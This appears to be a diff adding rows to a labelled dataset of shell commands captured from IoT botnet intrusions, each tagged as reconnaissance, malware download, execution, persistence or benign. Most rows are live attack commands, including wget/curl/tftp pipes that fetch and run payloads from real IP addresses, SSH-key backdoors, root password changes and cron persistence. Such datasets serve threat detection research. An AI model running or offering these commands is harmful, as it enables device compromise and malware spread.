+{"command": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"", "label": "persistence", "count": 49, "source": "real_round2"}
+{"command": "/bin/busybox echo > /etc/.b && sh /etc/.b && cd /etc/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": "tftp; wget; /bin/busybox YIBCC", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox BOTNET", "label": "reconnaissance", "count": 18, "source": "real_round2"}
+{"command": "Content-Length: 0", "label": "benign", "count": 18, "source": "real_round2"}
+{"command": "echo -e \"natasha123\\nbaIemyvImW1K\\nbaIemyvImW1K\"|passwd|bash", "label": "persistence", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox echo > /mnt/.fxcat && sh /mnt/.fxcat && cd /mnt/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "/bin/busybox WKBZT", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "busybox corona", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": ">/mnt/.codi && cd /mnt/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "/bin/busybox echo > /boot/.fxcat && sh /boot/.fxcat && cd /boot/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "/bin/busybox HISILICON", "label": "reconnaissance", "count": 146, "source": "real_round2"}
+{"command": "From: <sip:nm@nm>;tag=root", "label": "benign", "count": 18, "source": "real_round2"}
+{"command": "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI", "label": "reconnaissance", "count": 14, "source": "real_round2"}
+{"command": "echo \"root:mjfk9mmm5ecr\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "real_round2"}
+{"command": "echo WRITABLE >/tmp/.testfile 2>&1", "label": "reconnaissance", "count": 15, "source": "real_round2"}
+{"command": "sh .k", "label": "malware_execution", "count": 70, "source": "real_round2"}
+{"command": "free -h", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "echo -ne \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x78\\x38\\x36\\x5f\\x36\\x34\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x78\\x38\\x36\\x5f\\x36\\x34\\x22\\x20\\x3b\\x3b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x69\\x2a\\x38\\x36\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x78\\x38\\x36\\x5f\\x36\\x34\\x22\\x20\\x3b\\x3b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2a\\x29\\x20\\x41\\x52\\x43\\x48\\x3d\\x22\\x6d\\x69\\x70\\x73\\x22\\x20\\x3b\\x3b\\x20\\x23\\x20\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x20\\x66\\x61\\x6c\\x6c\\x62\\x61\\x63\\x6b\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x65\\x73\\x61\\x63\\x0a\" >> update.sh", "label": "malware_downloader", "count": 76, "source": "real_round2"}
+{"command": "/bin/busybox wget http://95.133.245.15/wget.sh -O- | sh;/bin/busybox tftp -g 95.133.245.15 -r tftp.sh -l- | sh;/bin/busybox ftpget 95.133.245.15 ftpget.sh ftpget.sh && sh ftpget.sh;curl http://95.133.245.15/curl.sh -o- | sh", "label": "malware_downloader", "count": 348, "source": "real_round2"}
+{"command": "(wget http://91.199.133.133:8080/deploy.sh -O- 2>/dev/null | sh) ||", "label": "malware_downloader", "count": 6, "source": "real_round2"}
+{"command": "cat /etc/passwd", "label": "reconnaissance", "count": 11, "source": "real_round2"}
+{"command": "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon", "label": "reconnaissance", "count": 14, "source": "real_round2"}
+{"command": "/bin/busybox wget http://45.150.195.235/tmips -O - > .a && /bin/busybox chmod 777 .a && ./.a telnet.wget", "label": "malware_downloader", "count": 105, "source": "real_round2"}
+{"command": ">/data/d && chmod 777 /data/d && /data/d && cd /data/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "/bin/busybox echo > /usr/.b && sh /usr/.b && cd /usr/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "echo test", "label": "reconnaissance", "count": 6, "source": "real_round2"}
+{"command": "busybox ftpget 77.90.185.66 f ftpget", "label": "malware_downloader", "count": 42, "source": "real_round2"}
+{"command": "Call-ID: 50000", "label": "benign", "count": 18, "source": "real_round2"}
+{"command": "FEAT", "label": "benign", "count": 6, "source": "real_round2"}
+{"command": "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "enablelinuxshell", "label": "reconnaissance", "count": 106, "source": "real_round2"}
+{"command": "wget http://176.65.139.202:80/telnet.sh -O /var/tmp/telnet.sh;chmod 777 /var/tmp/telnet.sh;sh /var/tmp/telnet.sh", "label": "malware_downloader", "count": 3, "source": "real_round2"}
+{"command": "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "label": "malware_downloader", "count": 6, "source": "real_round2"}
+{"command": "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=", "label": "benign", "count": 8, "source": "real_round2"}
+{"command": "/bin/busybox echo > /home/.b && sh /home/.b && cd /home/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": ">/home/d && chmod 777 /home/d && /home/d && cd /home/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 45.150.195.235 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;", "label": "malware_downloader", "count": 541, "source": "real_round2"}
+{"command": ">/tmp/.codi && cd /tmp/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": ">/root/d && chmod 777 /root/d && /root/d && cd /root/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "busybox wget http://5.182.210.174/ok", "label": "malware_downloader", "count": 1, "source": "real_round2"}
+{"command": ">/dev/.codi && cd /dev/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "za", "label": "benign", "count": 91, "source": "real_round2"}
+{"command": "echo LOGGED", "label": "reconnaissance", "count": 5, "source": "real_round2"}
+{"command": ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "head -c 0 > /tmp/linux_sign", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "chmod 777 update.armv5l 2>&1", "label": "malware_execution", "count": 3, "source": "real_round2"}
+{"command": "cd /dev/", "label": "benign", "count": 45, "source": "real_round2"}
+{"command": "start", "label": "benign", "count": 1, "source": "real_round2"}
+{"command": "echo 'wget -q http://94.154.43.92/$a -O .c||curl -s http://94.154.43.92/$a -o .c||tftp -g -l .c -r $a 94.154.43.92||tftp -g -l $a 94.154.43.92' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "./mipsel", "label": "malware_execution", "count": 2, "source": "real_round2"}
+{"command": "User-Agent: curl/7.61.1", "label": "benign", "count": 6, "source": "real_round2"}
+{"command": ">/data/.f && /bin/busybox chmod 777 /data/.f && /data/.f && cd /data/; ", "label": "reconnaissance", "count": 25, "source": "real_round2"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /; for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do; wget -q http://94.154.43.92/$a -O .c||curl -s http://94.154.43.92/$a -o .c||tftp -g -l .c -r $a 94.154.43.92||tftp -g -l $a 94.154.43.92; chmod +x .c && ./.c && break || chmod +x $a && ./$a && break; done; rm -f .c $a", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "echo '#!/bin/sh' > .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "(wget http://91.199.133.133:8080/deploy.sh -O /tmp/.ds 2>/dev/null && sh /tmp/.ds) ||", "label": "malware_downloader", "count": 6, "source": "real_round2"}
+{"command": "/bin/busybox IZORG", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "busybox curl -O http://5.182.210.174/ok", "label": "malware_downloader", "count": 1, "source": "real_round3"}
+{"command": "./bot_64", "label": "malware_execution", "count": 9, "source": "real_round3"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0", "label": "benign", "count": 2, "source": "real_round3"}
+{"command": "echo -ne \"\\x28\\x62\\x75\\x73\\x79\\x62\\x6f\\x78\\x20\\x77\\x67\\x65\\x74\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x24\\x48\\x4f\\x53\\x54\\x2f\\x72\\x65\\x61\\x6c\\x5f\\x24\\x52\\x45\\x41\\x4c\\x5f\\x41\\x52\\x43\\x48\\x20\\x2d\\x4f\\x20\\x24\\x42\\x49\\x4e\\x20\\x32\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x20\\x26\" >> update.sh", "label": "malware_downloader", "count": 76, "source": "real_round3"}
+{"command": "busybox sh ok", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "busybox tftp -g 77.90.185.66 -r tftp -l-", "label": "malware_downloader", "count": 42, "source": "real_round3"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.168.69.141/armv7l; chmod +x; armv7l; tftp -g 83.168.69.141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c", "label": "malware_downloader", "count": 4, "source": "real_round3"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DVZXQ", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "head -c 0 > /tmp/arm_linux_sign", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "/", "label": "benign", "count": 2, "source": "real_round3"}
+{"command": "To: <sip:nm2@nm2>", "label": "benign", "count": 18, "source": "real_round3"}
+{"command": "g & k | zpkfq", "label": "benign", "count": 91, "source": "real_round3"}
+{"command": "/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/", "label": "reconnaissance", "count": 241, "source": "real_round3"}
+{"command": "/bin/busybox wget http://205.237.110.232/wget.sh -O- | sh;/bin/busybox tftp -g 205.237.110.232 -r tftp.sh -l- | sh;/bin/busybox ftpget 205.237.110.232 ftpget.sh ftpget.sh && sh ftpget.sh;curl http://205.237.110.232/curl.sh -o- | sh", "label": "malware_downloader", "count": 348, "source": "real_round3"}
+{"command": "busybox wget http://185.93.89.72/wget -O-", "label": "malware_downloader", "count": 64, "source": "real_round3"}
+{"command": "/bin/busybox wget http://45.150.195.235/tmpsl -O - > .a && /bin/busybox chmod 777 .a && ./.a telnet.wget", "label": "malware_downloader", "count": 105, "source": "real_round3"}
+{"command": "cd /tmp || cd /var/tmp || cd /; curl -s http://94.154.43.10/bins/kla.sh | sh", "label": "malware_downloader", "count": 1, "source": "real_round3"}
+{"command": "/bin/busybox sNoMf6yo ", "label": "reconnaissance", "count": 3, "source": "real_round3"}
+{"command": "head -c 0 > /tmp/miner", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "tftp -g 185.93.89.72 -r tftp -l-", "label": "malware_downloader", "count": 42, "source": "real_round3"}
+{"command": "echo -ne \"\\x16\\x07\\x67\\x6f\\xea\\x0f\\xc9\\x46\\x0b\\xbf\\x60\\xb0\\xb5\\x9c\\x27\\x30\\x73\\xdf\\x34\\x06\\x8d\\x7b\\xce\\xd2\\x09\\x43\\x7d\\x61\\xb8\\xd6\\x68\\x39\" >> update.XDarmv5l", "label": "malware_downloader", "count": 1348, "source": "real_round3"}
+{"command": "curl -s http://45.74.3.37:5001/bins.sh", "label": "malware_downloader", "count": 1, "source": "real_round3"}
+{"command": "wget -q http://176.65.132.8/bot_64 -O bot_64", "label": "malware_downloader", "count": 20, "source": "real_round3"}
+{"command": "tftp; wget; /bin/busybox CPRIK", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "cd /tmp;(wget http://91.199.133.133:8080/deploy.sh -O- 2>/dev/null|sh)||(curl -s http://91.199.133.133:8080/deploy.sh 2>/dev/null|sh)||(busybox wget http://91.199.133.133:8080/deploy.sh -O- 2>/dev/null|sh)||(tftp -g -r deploy.sh 91.199.133.133 2>/dev/null;sh deploy.sh)&", "label": "malware_downloader", "count": 2, "source": "real_round3"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "label": "benign", "count": 4, "source": "real_round3"}
+{"command": "head -c 0 > /tmp/mips_linux", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "(score+4)", "label": "benign", "count": 50, "source": "real_round3"}
+{"command": "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;", "label": "malware_downloader", "count": 541, "source": "real_round3"}
+{"command": "./ok", "label": "malware_execution", "count": 1, "source": "real_round3"}
+{"command": "echo \"root:35nhsZ3NcKt3\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "real_round3"}
+{"command": "dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s", "label": "reconnaissance", "count": 12, "source": "real_round3"}
+{"command": "wget -O /tmp/agent http://176.65.132.8:4444/agent_amd64 && chmod +x /tmp/agent && echo DOWNLOADED_OK", "label": "malware_downloader", "count": 4, "source": "real_round3"}
+{"command": "file /sbin/init", "label": "reconnaissance", "count": 17, "source": "real_round3"}
+{"command": "/bin/busybox VMTCF", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"", "label": "reconnaissance", "count": 27665, "source": "real_round3"}
+{"command": "busybox ftpget 185.93.89.72 f ftpget", "label": "malware_downloader", "count": 42, "source": "real_round3"}
+{"command": "/bin/busybox cat /bin/echo", "label": "reconnaissance", "count": 16, "source": "real_round3"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86;do wget -q http://94.154.43.92/$a -O .b||curl -s http://94.154.43.92/$a -o .b||tftp -g -l .b -r $a 94.154.43.92||tftp -g -l $a 94.154.43.92;chmod +x .b && ./.b && break || chmod +x $a && ./$a && break;done;rm -f .b $a", "label": "malware_downloader", "count": 174, "source": "real_round3"}
+{"command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh", "label": "malware_downloader", "count": 8, "source": "real_round3"}
+{"command": "uname -m 2>/dev/null", "label": "reconnaissance", "count": 2, "source": "real_round3"}
+{"command": "(ftpget 77.90.185.66 f ftpget || busybox ftpget 77.90.185.66 f ftpget) > f; chmod 777 f; ./f; rm -rf f", "label": "malware_downloader", "count": 42, "source": "real_round3"}
+{"command": "head -c 0 > /tmp/winminer_sign", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /; for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do; wget -q http://94.154.43.41/$a -O .c||curl -s http://94.154.43.41/$a -o .c||tftp -g -l .c -r $a 94.154.43.41||tftp -g -l $a 94.154.43.41; chmod +x .c && ./.c && break || chmod +x $a && ./$a && break; done; rm -f .c $a", "label": "malware_downloader", "count": 174, "source": "real_round3"}
+{"command": "wget http://176.65.132.8/mipsel", "label": "malware_downloader", "count": 34, "source": "real_round3"}
+{"command": "echo SHELL_TEST", "label": "reconnaissance", "count": 55, "source": "real_round3"}
+{"command": "/bin/busybox XGWOO", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "ftpget 185.93.89.72 f ftpget", "label": "malware_downloader", "count": 42, "source": "real_round3"}
+{"command": "echo 'wget -q http://94.154.43.41/$a -O .c||curl -s http://94.154.43.41/$a -o .c||tftp -g -l .c -r $a 94.154.43.41||tftp -g -l $a 94.154.43.41' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round3"}
+{"command": "Max-Forwards: 70", "label": "benign", "count": 18, "source": "real_round3"}
+{"command": "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &", "label": "malware_downloader", "count": 1, "source": "real_round3"}
+{"command": "/bin/busybox ftpget bins.oceanic-node.su ftpget.sh ftpget.sh && sh ftpget.sh", "label": "malware_downloader", "count": 1, "source": "real_round3"}
+{"command": "echo \"natasha123\\nbaIemyvImW1K\\nbaIemyvImW1K\\n\"|passwd", "label": "persistence", "count": 1, "source": "real_round3"}
+{"command": "cat /proc/mounts; /bin/busybox XGWOO", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": ">/usr/.f && /bin/busybox chmod 777 /usr/.f && /usr/.f && cd /usr/; ", "label": "reconnaissance", "count": 25, "source": "real_round3"}
+{"command": "echo -ne \"\\x0c\\x00\\x92\\xe8\\x41\\x41\\x00\\xeb\\xa0\\x3e\\xa0\\xe1\\x81\\x31\\x83\\xe1\\xa1\\x4e\\xa0\\xe1\\x03\\x50\\x20\\xe0\\x04\\x60\\x21\\xe0\\x0c\\x51\\x8d\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 2579, "source": "real_round3"}
+{"command": ">/root/.f && /bin/busybox chmod 777 /root/.f && /root/.f && cd /root/; /bin/busybox", "label": "reconnaissance", "count": 25, "source": "real_round3"}
+{"command": "busybox", "label": "reconnaissance", "count": 50, "source": "real_round3"}
+{"command": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w", "label": "malware_downloader", "count": 64, "source": "real_round3"}
+{"command": "wget http://77.90.185.66/wget -O-", "label": "malware_downloader", "count": 64, "source": "real_round3"}
+{"command": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "label": "malware_downloader", "count": 4, "source": "real_round3"}
+{"command": "cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>#!/bin/sh; HOST=\"91.199.133.133:8080\"; BIN=/tmp/.n; /dev/null; ARCH=\"\"; CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20); case \"$CPUINFO\" in;     *mips*el*|*MIPS*el*|*mips*le*) ARCH=\"mipsel\" ;;;     *mips*|*MIPS*) ARCH=\"mips\" ;;;     *arm*|*ARM*);         if echo \"$CPUINFO\" | grep -q \"v7\"; then ARCH=\"armv7l\";         elif echo \"$CPUINFO\" | grep -q \"aarch64\\|armv8\\|arm64\"; then ARCH=\"arm\";         else ARCH=\"arm\"; fi ;;;     *x86_64*|*amd64*|*AMD64*) ARCH=\"x86_64\" ;;;     *i486*|*i586*|*i686*|*Intel*) ARCH=\"x86_64\" ;;;     *powerpc*|*ppc*|*PowerPC*) ARCH=\"powerpc\" ;;;     *);         UNAME=$(uname -m 2>/dev/null);         case \"$UNAME\" in;             mips) ARCH=\"mips\" ;;;             mipsel) ARCH=\"mipsel\" ;;;             arm*) ARCH=\"arm\" ;;;             aarch64) ARCH=\"arm\" ;;;             x86_64) ARCH=\"x86_64\" ;;;             i*86) ARCH=\"x86_64\" ;;;             *) ARCH=\"mips\" ;; # default fallback;         esac;         ;;; esac; case \"$ARCH\" in;     armv7l|armv5l|armv4l|arm) REAL_ARCH=\"arm\" ;;;     mips) REAL_ARCH=\"mips\" ;;;     mipsel) REAL_ARCH=\"mipsel\" ;;;     x86_64|i486) REAL_ARCH=\"x86_64\" ;;;     powerpc) REAL_ARCH=\"arm\" ;; # fallback to arm;     *) REAL_ARCH=\"mips\" ;;; (wget http://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null && chmod (curl -s http://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null && chm(busybox wget http://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null && chmod 7esac; 777 $BIN && $BIN) ||; od 777 $BIN && $BIN) ||; & chmod 777 $BIN && $BIN) ||; 77 $BIN && $BIN) ||; (exec 3<>/dev/tcp/91.199.133.133/8080 2>/dev/null && echo -e \"GET /real_$REAL_ARCH HTTP/1.0\\r\\nHost: 91.199.133.133\\r\\n\\r\\n\" >&3 && (read -r h; while read -r l && [ -n \"$l\" ]; do :; done; cat) <&3 > $BIN && chmod 777 $BIN && $BIN)", "label": "malware_downloader", "count": 4, "source": "real_round3"}
+{"command": "head -c 0 > /tmp/windows", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "echo LOGIN_OK", "label": "reconnaissance", "count": 22, "source": "real_round3"}
+{"command": "echo SHELL_OK", "label": "reconnaissance", "count": 6, "source": "real_round3"}
+{"command": "cat /proc/mounts; /bin/busybox DVZXQ", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "chmod +x bot_64", "label": "malware_execution", "count": 9, "source": "real_round3"}
+{"command": "score+4", "label": "benign", "count": 50, "source": "real_round3"}
+{"command": "echo curl", "label": "reconnaissance", "count": 6, "source": "real_round3"}
+{"command": "chmod +x mipsel", "label": "malware_execution", "count": 2, "source": "real_round3"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "label": "benign", "count": 1, "source": "real_round3"}
+{"command": "echo '*/5 * * * * cd /tmp; wget -q http://196.251.121.142/install.sh -O k.sh; sh k.sh selfrep.telnet' >> /etc/crontabs/root 2>/dev/null; echo 'cd /tmp; wget -q http://196.251.121.142/install.sh -O k.sh; sh k.sh selfrep.telnet' >> /etc/init.d/rcS 2>/dev/null; echo 'cd /tmp; wget -q http://196.251.121.142/install.sh -O k.sh; sh k.sh selfrep.telnet' >> /etc/rc.local 2>/dev/null", "label": "persistence", "count": 4, "source": "real_round3"}
+{"command": "Accept-Encoding: gzip", "label": "benign", "count": 23, "source": "real_round3"}
+{"command": "chmod 777 /tmp/BVleSa6vA3", "label": "malware_execution", "count": 1, "source": "real_round3"}
+{"command": "cat /proc/mounts; /bin/busybox HDKII", "label": "reconnaissance", "count": 1, "source": "real_round3"}
+{"command": "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;/bin/busybox tftp -g 45.150.195.235 tftp.sh tftp.sh; chmod 777 tftp.sh && sh tftp.sh;/bin/busybox ftpget 45.150.195.235 -P 8121 ftp.sh ftp.sh; chmod 777 tftp.sh && sh tftp.sh;", "label": "malware_downloader", "count": 32, "source": "real_round3"}
+{"command": "sh /tmp/.ds", "label": "malware_execution", "count": 6, "source": "real_round4"}
+{"command": "cat $pid/comm", "label": "reconnaissance", "count": 16, "source": "real_round4"}
+{"command": "/dev/shm/bins.sh", "label": "malware_execution", "count": 1, "source": "real_round4"}
+{"command": "/bin/busybox hostname TBOT", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "/bin/busybox Cult", "label": "reconnaissance", "count": 10, "source": "real_round4"}
+{"command": "curl -sk https://217.60.195.113/sh", "label": "malware_downloader", "count": 6, "source": "real_round4"}
+{"command": "Enter new UNIX password: ", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": ">/home/.f && /bin/busybox chmod 777 /home/.f && /home/.f && cd /home/; ", "label": "reconnaissance", "count": 25, "source": "real_round4"}
+{"command": "we", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k", "label": "malware_downloader", "count": 7, "source": "real_round4"}
+{"command": ">/dev/shm/.f && /bin/busybox chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/; ", "label": "reconnaissance", "count": 25, "source": "real_round4"}
+{"command": "sh .dl", "label": "malware_execution", "count": 1, "source": "real_round4"}
+{"command": "/bin/busybox condixx", "label": "reconnaissance", "count": 56, "source": "real_round4"}
+{"command": "12345", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "busybox TEST", "label": "reconnaissance", "count": 2, "source": "real_round4"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.63 Chrome/124.0.6367.63 Not-A.Brand/99  Safari/537.36", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "echo \"root:mH0MkhBjLDbi\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "real_round4"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86;do wget -q http://94.154.43.41/$a -O .b||curl -s http://94.154.43.41/$a -o .b||tftp -g -l .b -r $a 94.154.43.41||tftp -g -l $a 94.154.43.41;chmod +x .b && ./.b && break || chmod +x $a && ./$a && break;done;rm -f .b $a", "label": "malware_downloader", "count": 174, "source": "real_round4"}
+{"command": "score+3", "label": "benign", "count": 50, "source": "real_round4"}
